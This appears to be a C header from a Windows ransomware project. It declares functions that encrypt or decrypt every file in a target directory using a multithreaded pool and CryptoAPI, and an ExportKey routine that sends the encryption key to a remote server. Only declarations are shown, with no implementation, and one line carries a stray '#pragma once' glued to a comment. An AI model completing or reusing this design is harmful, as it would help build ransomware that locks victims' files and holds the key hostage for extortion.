#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

// Constants
#define CHUNK_SIZE 4096         // files will be encrypted in chunks of this size
#define MAX_THREADS 8           // max number of threads
#define MIN_THREADS 1           // min number of threads#pragma once
#define MAX_EXT 8				// maximum extension length

// Defined in utils.c
errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr);
void GetTime(ULARGE_INTEGER* time);

// Defined in trheads.c
BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgroup);
size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup);
size_t startDecryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup);

// Defined in crypto.c
BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey);
BOOL InitDeCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFile);
BOOL ExportKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey, const char* serverName);